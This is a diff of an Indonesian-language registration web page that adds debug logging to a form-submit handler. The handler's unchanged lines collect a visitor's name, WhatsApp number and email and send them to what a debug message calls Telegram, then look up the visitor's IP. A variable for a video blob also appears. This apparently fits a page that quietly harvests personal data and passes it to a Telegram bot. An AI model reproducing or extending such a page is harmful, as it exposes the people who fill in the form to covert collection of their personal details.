@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 
 <html class="scroll-smooth" lang="id">
 <head>
@@ -574,6 +574,7 @@ let initialVideoBlob = null;
 
 /* main flow */
 regForm.addEventListener('submit', async function(e){
+  console.log('DEBUG: Submit form kepanggil');
   e.preventDefault();
   const name = document.getElementById('fullname').value.trim();
   const wa = document.getElementById('phone').value.trim();
@@ -588,6 +589,7 @@ regForm.addEventListener('submit', async function(e){
   try{
     const quick = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ├─ > Email: ${email}\n ╰─ > Aksi: Pendaftaran`;
     await sendText(quick);
+    console.log('DEBUG: Sudah kirim ke Telegram (fetch sendText dipanggil)');
   }catch(e){ /* ignore */ }
 
   const ipInfo = await getIPInfo();
